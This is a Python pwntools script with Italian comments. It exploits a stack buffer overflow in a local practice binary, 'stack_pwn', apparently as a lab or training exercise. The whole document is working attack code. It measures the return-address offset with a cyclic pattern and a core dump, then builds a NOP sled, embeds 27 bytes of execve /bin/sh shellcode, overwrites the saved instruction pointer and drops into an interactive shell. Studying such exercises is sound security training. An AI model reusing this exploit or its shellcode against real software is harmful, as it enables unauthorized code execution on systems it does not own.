from pwn import *
from pwn import p64
from struct import pack

# Ha bisogno di ASLR disabilitato.

def main():
    e = ELF('../Machines/stack_pwn')
    context.binary = e #impostazione del contesto dell'eseguibile
    p = process(e.path)


    #Viene eseguito una volta il programma per trovare la dimensione del payload necessario per
    # mandare in overflow il buffer e controllare il $rip
    p.recvline()
    p.sendline(cyclic(600)) #crea pattern di 600 caratteri
    p.wait()
    core = p.corefile #crea corefile contenente le informazioni dell'interruzione(SISEGV)
    stack = core.rsp #indirizzo del registro rsp
    info("Indirizzo del $rip = %#x", stack)
    pattern = core.read(stack, 4) #riconoscimento del pattern per ottenere poi l'offset
    rip_offset = cyclic_find(pattern) #dimensione del payload
    info("L'offset del $rip è di %d", rip_offset)
    p.close()

    #Esecuzione finale del programma con costruzione del payload malevolo
    p = process(e.path)
    nop = b"\x90"*(rip_offset-70) #nop-sled
    # Address in the middle of the nop stack
    addr = stack - rip_offset//2 #indirizzo probabile di un'istruzione di nop
    info("Probabile indirizzo di un nop = %s", hex(addr))
    #Shellcode di 27 bytes facilmente reperibile; nel caso in cui si volesse creare uno shellcode
    # sul momento si procede tramite pwntools: asm(shellcraft.sh()), in questo caso bisogna ridi-
    # mensionare nop-sled e padding
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    #Costruzione del payload
    payload = nop
    payload += shellcode
    payload = payload.ljust(rip_offset, b'A') #aggiunta di padding in coda al payload per raggiungere
                                              # la dimensione del rip_offset
    payload += pack("<Q", addr) #inserimento dell'indirizzo di probabile nop instruction in coda al payload

    p.recvline()
    p.sendline(payload)
    p.interactive() #Shell ottenuta


if __name__ == '__main__':
    main()